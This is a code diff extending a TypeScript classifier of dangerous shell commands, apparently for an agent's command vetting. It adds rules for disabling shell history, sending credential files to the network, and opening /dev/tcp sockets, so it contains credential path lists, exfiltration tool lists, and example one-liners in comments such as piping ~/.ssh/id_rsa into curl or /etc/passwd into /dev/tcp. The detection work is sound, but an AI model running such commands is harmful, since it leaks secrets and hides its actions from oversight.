@@ -2179,8 +2179,17 @@ const NETWORK_FETCH_PROGRAMS = new Set(["curl", "wget"]);
  */
 const SCRIPT_INTERPRETERS = new Set(["sh", "bash", "dash", "ksh", "zsh", "python", "python3", "node", "perl"]);
 
-/** The program a segment actually runs, past its scaffolding and its wrappers. */
-function segmentProgram(segment: string): string | undefined {
+/**
+ * The program a segment actually runs, past its scaffolding and its wrappers.
+ *
+ * The platform defaults to POSIX because the pipe rule below is the original
+ * caller and is POSIX-only. The exfiltration rule passes `windows` explicitly,
+ * and needs to: `executableName` strips `.exe` on the Windows branch and not on
+ * the POSIX one, so a sender spelled `curl.exe` — which is how it is spelled in
+ * a PowerShell line, because that is the one on the path — reads as `curl.exe`
+ * here and matches nothing.
+ */
+function segmentProgram(segment: string, platform: DangerousCommandPlatform = "posix"): string | undefined {
 	let tokens = tokenizeShell(segment);
 	const scaffolded = stripShellScaffolding(tokens);
 	if (scaffolded !== undefined) tokens = scaffolded;
@@ -2193,7 +2202,7 @@ function segmentProgram(segment: string): string | undefined {
 	// on the list, so a loop that only consults the list walks straight past it.
 	for (let hops = 0; hops < MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH; hops++) {
 		if (tokens.length === 0) return undefined;
-		const name = executableName(tokens[0], "posix");
+		const name = executableName(tokens[0], platform);
 		if (name === undefined) return undefined;
 		if (name !== "sudo" && !COMMAND_PREFIX_PROGRAMS.has(name)) return name;
 		tokens = commandAfterOptions(tokens.slice(1), valueOptionsFor(name));
@@ -2230,6 +2239,359 @@ function fetchPipedIntoInterpreter(segments: string[]): DangerousCommandMatch | 
 }
 
 /**
+ * Shell history that has been turned off.
+ *
+ * The commands above this one in a transcript are the record of what the agent
+ * did. Two spellings stop the shell from adding to it, and both were measured
+ * with the history file pre-seeded with one line so that "stopped writing" is
+ * distinguishable from "erased", and with `set -o history` forced on first
+ * because a non-interactive shell never creates a HISTFILE at all and every
+ * row would otherwise read zero:
+ *
+ * - baseline (no variant line at all): 4 lines, the seed plus three. Every
+ *   other number below is compared against THAT row, and every variant runs the
+ *   byte-identical script with exactly one line swapped — the first attempt at
+ *   this measurement gave each row a different script, so the counts could not
+ *   be compared to each other and the table below would have been unreadable.
+ * - `unset HISTFILE`: 1 line — the seed, still intact. Nothing was erased; the
+ *   three commands simply were not recorded.
+ * - `set +o history`: 1 line, identical.
+ * - `export HISTFILE=/dev/null` and `export HISTFILE=`: 1 line, identical — the
+ *   writes go to /dev/null, which is where the measured "1 line" comes from.
+ *   Those two are caught by `historyAssignmentRule` below, not by this function.
+ *
+ * Six near neighbours are measured non-actions and are deliberately absent, all
+ * of them reading 5 lines against the baseline's 4 — the extra line being the
+ * variant line itself, recorded like any other command:
+ *
+ * - `set +oh` and `set +O history`. Short flags do NOT combine for `set` here,
+ *   and the capital O is a different thing. This was tried on the reasoning that
+ *   short flags combine the way `git clean -fn` does; they do not, and an earlier
+ *   version of the `set` branch below accepted the cluster until this measured.
+ * - `set +o historyx`, which names no option.
+ * - `history -c`: 4 lines, exactly the baseline, seed intact. It clears an
+ *   in-memory list, not the file, so neither suppresses the next three commands
+ *   nor removes the record of the ones before it.
+ * - `unset HISTSIZE`: 5 lines, appending like a baseline.
+ * - `set -o history`: the opposite of the rule.
+ *
+ * **A fourth builtin spelling group was here and is gone.** `export HISTFILE`,
+ * `readonly HISTFILE`, `declare -x HISTFILE` and `typeset HISTFILE` — the forms
+ * with no `=` at all — were each measured at 5 lines, identical to the
+ * non-actions: with HISTFILE already set, `export HISTFILE` re-exports the value
+ * it has and changes nothing. Only the `=` spellings suppress, and those reach
+ * `historyAssignmentRule`, which is a strict superset of the branch that was
+ * deleted. So the branch was unreachable for everything it could catch.
+ */
+function historyRules(segment: string): DangerousCommandMatch | null {
+	const tokens = tokenizeShell(segment);
+	const program = executableName(tokens[0] ?? "", "posix");
+	if (program === "set") {
+		// `set +o history` is the fourth spelling measured to suppress. `set -o
+		// history` turns the record *on* and is left alone, which is why the sign
+		// is read rather than the pair.
+		//
+		// `set +oh` and `set +history` are measured NOT to suppress — each wrote
+		// every line, the same as any no-op setup line — so the short cluster is
+		// not here. An earlier version of this branch accepted them, on the
+		// reasoning that short flags combine; the measurement says bash does not
+		// combine them for `set`, and the branch went rather than the measurement.
+		const args = tokens.slice(1);
+		const at = args.findIndex((arg) => arg === "+o" || arg === "-o");
+		if (at === -1 || args[at] !== "+o") return null;
+		if (args[at + 1] !== "history") return null;
+		return { kind: "Other", rule: "`set +o history`, which stops the shell recording what runs" };
+	}
+	if (program === "unset" || program === "unsetenv") {
+		// `unset HISTFILE HISTFILESIZE` unsets both, and only the first is this
+		// rule; the second is ordinary and is not named.
+		if (tokens.slice(1).some((arg) => arg === "HISTFILE")) {
+			return { kind: "Other", rule: "`unset HISTFILE`, which stops the shell recording what runs" };
+		}
+		return null;
+	}
+	return null;
+}
+
+/**
+ * The same rule for the assignment spelling, where there is no program to read.
+ *
+ * `HISTFILE=/dev/null bash` and `HISTFILE= bash -c '…'` have no `unset` in them
+ * at all, and `stripLeadingAssignments` inside `matchTokens` removes the token
+ * before any rule sees it — so this reads the raw segment text for the one
+ * shape the others cannot. It is deliberately narrow: `HISTFILE` followed by
+ * `=` and either nothing or `/dev/null`. A line that merely mentions the
+ * variable — `echo $HISTFILE`, `ls "$HISTFILE"` — has no `=` after it here and
+ * is left alone, which is checked.
+ *
+ * **What is measured here, and what is not.** An assignment prefix binds for the
+ * one command it is attached to, so the only way to see whether it suppresses is
+ * to look at what that child recorded. Measured: `HISTFILE=/dev/null true` and
+ * `env HISTFILE=/dev/null true` each wrote 5 lines, against the 4 of a control
+ * that has no variant line at all — so in the non-interactive shell this is a
+ * no-op, exactly like `set +oh`. The three commands are still recorded, because
+ * the child they name records everything regardless of the file it was given.
+ *
+ * What could NOT be measured is the case the rule exists for. An interactive
+ * child genuinely does stop recording when its `HISTFILE` points at /dev/null,
+ * and that is the whole argument for keeping the rule — but an interactive bash
+ * needs a terminal, this machine has no `script` to allocate one, and a bash fed
+ * from a pipe is not interactive for history purposes: given a real HISTFILE it
+ * recorded nothing either, so that attempt's positive control failed and its
+ * answer is void rather than negative.
+ *
+ * So: kept for the interactive child, measured to do nothing in the
+ * non-interactive one, and the test rows say exactly that. What is NOT claimed
+ * is that this changes anything for the non-interactive commands an agent
+ * actually runs; it does not.
+ */
+function historyAssignmentRule(segment: string): DangerousCommandMatch | null {
+	const match = /(?:^|[\s;|&])(?:export\s+)?HISTFILE=([^\s;|&]*)/.exec(segment);
+	if (match === null) return null;
+	const value = match[1];
+	if (value !== "" && value !== "/dev/null") return null;
+	return { kind: "Other", rule: "`HISTFILE=` as an assignment, which stops the shell recording what runs" };
+}
+
+/**
+ * Path suffixes whose contents are somebody's credential.
+ *
+ * A suffix rather than a full path, because the same file is named at least
+ * four ways — `~/.ssh/id_rsa`, `$HOME/.ssh/id_rsa`,
+ * `C:\Users\<name>\.ssh\id_rsa` and `/home/<name>/.ssh/id_rsa` — and a table of
+ * full paths would catch one spelling and quietly miss the other three. Nothing
+ * here is ever opened: this file classifies command lines and does not touch the
+ * filesystem, so the names below are strings and only strings.
+ *
+ * Each entry is a whole trailing path, never a prefix of one. `id_rsa` is here
+ * and `id_rsa.pub` is not, because a public key is the one half of that file
+ * pair that is meant to be given away; matching by prefix would catch both, and
+ * a rule that flags publishing a public key is a rule people learn to switch
+ * off.
+ */
+const CREDENTIAL_SUFFIXES: readonly string[] = [
+	".ssh/id_rsa",
+	".ssh/id_dsa",
+	".ssh/id_ecdsa",
+	".ssh/id_ed25519",
+	".ssh/id_ecdsa_sk",
+	".ssh/id_ed25519_sk",
+	".aws/credentials",
+	".aws/config",
+	".config/gcloud/credentials.db",
+	".config/gcloud/application_default_credentials.json",
+	".config/gh/hosts.yml",
+	".docker/config.json",
+	".kube/config",
+	".azure/accessTokens.json",
+	".azure/msal_token_cache.json",
+	".npmrc",
+	".netrc",
+	".pgpass",
+	".git-credentials",
+	".gnupg",
+	".env",
+	".env.local",
+	".env.development",
+	".env.production",
+];
+
+/**
+ * Programs that can carry a file off the machine.
+ *
+ * `nc`, `ncat`, `socat`, `telnet`, `rsync`, `ftp`, `mail` and `sendmail` are in
+ * this list and none of them is installed on the machine these rules were
+ * written on, so their part of the table is read from what they are documented
+ * to do rather than measured — `nc -e` in particular could not be measured at
+ * all here. They stay because a classifier written on one machine and run on
+ * another is the normal case, and a list that only had the tools that happened
+ * to be present would be a list of this machine.
+ */
+const CREDENTIAL_SENDERS: ReadonlySet<string> = new Set([
+	"curl",
+	"scp",
+	"sftp",
+	"ssh",
+	"rsync",
+	"wget",
+	"nc",
+	"ncat",
+	"netcat",
+	"socat",
+	"telnet",
+	"ftp",
+	"mail",
+	"sendmail",
+]);
+
+/**
+ * The Windows spellings of the same idea, kept apart rather than merged.
+ *
+ * `curl`, `scp`, `ssh` and the `nc` family are in both lists by name and reach
+ * this one through `segmentProgram`'s Windows branch, which is what strips the
+ * `.exe`. The five below are Windows-only: PowerShell's own web cmdlets, and
+ * `certutil`, whose `-urlcache -split -f FILE URL` form reads a local file and
+ * puts it at an address.
+ *
+ * Not measured on this machine — none of these was run, and `certutil -urlcache`
+ * in particular would have needed a live request. The names are what each is
+ * documented to do, and the rule that uses them is the same one the POSIX side
+ * of this batch measured end to end.
+ */
+const WINDOWS_CREDENTIAL_SENDERS: ReadonlySet<string> = new Set([
+	"invoke-webrequest",
+	"iwr",
+	"invoke-restmethod",
+	"irm",
+	"start-bitstransfer",
+	"certutil",
+	"bitsadmin",
+]);
+
+/** Whether one token names a credential file, matched on whole trailing segments. */
+function namesCredential(token: string): string | undefined {
+	// The `@file` and `name=@file` spellings put something in front of the path.
+	// Both were measured to send the file: `curl -d @FILE` and `curl -F key=@FILE`
+	// each put the file's bytes on the wire, so the prefix is stripped rather
+	// than treated as part of the name.
+	const cleaned = token.replace(/^.*@/, "");
+	const normalized = cleaned.replace(/\\/g, "/").replace(/^\.\//, "");
+	for (const suffix of CREDENTIAL_SUFFIXES) {
+		if (normalized === suffix) return suffix;
+		if (normalized.endsWith(`/${suffix}`)) return suffix;
+	}
+	return undefined;
+}
+
+/**
+ * The two curl flags whose `@` is a character rather than an instruction.
+ *
+ * Every curl flag that takes a file was measured against a listener on
+ * 127.0.0.1, one at a time, and the answer is not what the names suggest:
+ *
+ * - reads the file, and sends its bytes: `-d`, `--data`, `--data-ascii`,
+ *   `--data-binary`, `--data-urlencode`, `-F`, `--form`, `-T`, `--upload-file`.
+ *   `--data-ascii` is the one most likely to be guessed wrong — the name reads
+ *   like a text conversion, and it reads a file like the rest.
+ * - does not: `--data-raw` and `--form-string`. Each sent nothing of the file,
+ *   because both take their argument literally. `curl --help all` describes
+ *   `--data-raw` as "'@' allowed", which reads the other way round.
+ *
+ * Only the two are listed. A flag added to the second list is a flag the
+ * classifier will call harmless without having measured it, which is the more
+ * expensive of the two mistakes available here.
+ */
+const CURL_NON_READING_DATA_FLAGS: ReadonlySet<string> = new Set(["--data-raw", "--form-string"]);
+
+/** The tokens in a segment that actually name a file, given the flags above. */
+function credentialTokensIn(segment: string, platform: DangerousCommandPlatform): string[] {
+	const tokens = tokenizeShell(segment);
+	const program = executableName(tokens[0] ?? "", platform);
+	if (program !== "curl") return tokens;
+	const named: string[] = [];
+	for (let i = 1; i < tokens.length; i++) {
+		// The value is skipped as well as the flag: `--data-raw @FILE` is one
+		// argument written as two tokens, and stepping over the name alone would
+		// leave the path to be read as a credential reference — which is exactly
+		// the shape this set exists to stop.
+		if (CURL_NON_READING_DATA_FLAGS.has(tokens[i])) {
+			i++;
+			continue;
+		}
+		// This one line is also what covers `--data-raw=@FILE`, and there used to
+		// be a second check naming those two flags with an `=`. The driver deleted
+		// that second check and nothing went red, which is not "the rule is
+		// untested" — it is that every token the second check could match begins
+		// with a `-`, and this line skips all of them for a reason that has
+		// nothing to do with which flag it is. Kept this way rather than deleted:
+		// the two `--flag=value` rows below are pinned through it.
+		if (tokens[i].startsWith("-")) continue;
+		named.push(tokens[i]);
+	}
+	return named;
+}
+
+/**
+ * A credential named on a line that also reaches the network.
+ *
+ * The two halves are read from the whole line rather than from one segment,
+ * because the two ordinary spellings put them on opposite sides of a pipe:
+ * `curl -T ~/.ssh/id_rsa URL` names both in one segment, and
+ * `cat ~/.ssh/id_rsa | curl -d @- URL` does not. A rule that read only the
+ * segment holding the sender would catch the first and miss the second, which is
+ * the more careful of the two.
+ *
+ * Whether the upload actually happens was measured, against a listener bound to
+ * 127.0.0.1 and nothing else: `curl -d @FILE`, `--data-binary @FILE`,
+ * `-F name=@FILE` and `-T FILE` each sent the file's bytes, and so did
+ * `cat FILE | curl -d @-`, `| -F up=@-`, `| -T -` and `curl -d @- < FILE`.
+ *
+ * `--data-raw` is measured as the one that does *not*: it sent 208 bytes to that
+ * listener and none of them were the file's, because `--data-raw` takes its `@`
+ * literally even though `curl --help all` describes it as "'@' allowed". It is
+ * left out on that measurement, not on the reasoning that it ought to read the
+ * file the way its siblings do.
+ */
+function credentialExfiltrationRules(
+	segments: string[],
+	platform: DangerousCommandPlatform,
+): DangerousCommandMatch | null {
+	// `curl`, `scp` and `ssh` are spelled the same in both, so the Windows list
+	// is the union rather than a replacement — a CMD line using `curl.exe` is the
+	// same act as a bash line using `curl`.
+	const senders =
+		platform === "windows" ? new Set([...CREDENTIAL_SENDERS, ...WINDOWS_CREDENTIAL_SENDERS]) : CREDENTIAL_SENDERS;
+	let credential: string | undefined;
+	let reader: string | undefined;
+	for (const segment of segments) {
+		for (const token of credentialTokensIn(segment, platform)) {
+			const named = namesCredential(token);
+			if (named === undefined) continue;
+			credential = named;
+			reader = segmentProgram(segment, platform) ?? tokenizeShell(segment)[0];
+			break;
+		}
+		if (credential !== undefined) break;
+	}
+	if (credential === undefined) return null;
+
+	for (const segment of segments) {
+		const program = segmentProgram(segment, platform);
+		if (program === undefined || !senders.has(program)) continue;
+		const source = reader === undefined ? "this line" : `\`${reader}\``;
+		return {
+			kind: "Other",
+			rule: `${source} sending \`${credential}\` to the network with \`${program}\`, which publishes a credential`,
+		};
+	}
+	return null;
+}
+
+/**
+ * A raw socket opened through bash's own `/dev/tcp`.
+ *
+ * Measured on this machine against a listener on 127.0.0.1, in three spellings:
+ * `cat FILE > /dev/tcp/host/port` sent the file's 11 bytes, so did
+ * `exec 3<>/dev/tcp/host/port` followed by `cat FILE >&3`, and so did the same
+ * run through `sh -c`. That matters more than usual here: `nc`, `ncat` and
+ * `socat` are all absent from this machine, so `/dev/tcp` is not one spelling
+ * among several for a raw socket, it is the one that works.
+ *
+ * No credential is required to trip it. A redirection to `/dev/tcp` is a socket
+ * to a named host and the host is the part that matters; requiring a credential
+ * on the same line would miss `cat /etc/passwd | tee /dev/tcp/…`, which was
+ * measured to send those bytes too.
+ */
+function devTcpRule(segment: string): DangerousCommandMatch | null {
+	for (const token of tokenizeShell(segment)) {
+		if (token.includes("/dev/tcp/")) {
+			return { kind: "Other", rule: "`/dev/tcp`, which opens a raw socket to a named host" };
+		}
+	}
+	return null;
+}
+
+/**
  * Classify a whole command line, one segment at a time.
  *
  * Shared with the `eval` branch above rather than written twice. It has to be
@@ -2240,10 +2602,33 @@ function fetchPipedIntoInterpreter(segments: string[]): DangerousCommandMatch | 
  */
 function matchScript(script: string, depth: number, platform: DangerousCommandPlatform): DangerousCommandMatch | null {
 	const segments = splitShellCommands(script);
+	// A credential named on a line that also reaches the network is the same act
+	// in either shell, so this one is asked on both platforms rather than being
+	// kept inside the POSIX block below. `namesCredential` normalises backslashes
+	// itself, and `segmentProgram` is told which platform it is reading so that
+	// `curl.exe` — how a PowerShell line spells it — reaches the sender list.
+	const exfiltrating = credentialExfiltrationRules(segments, platform);
+	if (exfiltrating) return exfiltrating;
 	// Only POSIX spells a pipe this way between two commands that are each
 	// ordinary on their own. Windows reads the same characters, but there the
 	// dangerous end of the pipe is already a rule of its own.
 	if (platform === "posix") {
+		for (const segment of segments) {
+			const tcp = devTcpRule(segment);
+			if (tcp) return tcp;
+			// The body of `sh -c 'unset HISTFILE'` is a segment of its own to the
+			// shell that runs it and not one here, so the wrapper's script is read
+			// as well as the segment. Only the history rules do this: every other
+			// rule in this file is reached through `matchTokens`, which already
+			// unwraps, and these two live here because the assignment strip inside
+			// `matchTokens` would take `HISTFILE=` off before they could read it.
+			const inner = wrapperScript(tokenizeShell(segment));
+			const targets = inner === undefined ? [segment] : [segment, inner];
+			for (const target of targets) {
+				const history = historyRules(target) ?? historyAssignmentRule(target);
+				if (history) return history;
+			}
+		}
 		const piped = fetchPipedIntoInterpreter(segments);
 		if (piped) return piped;
 	}
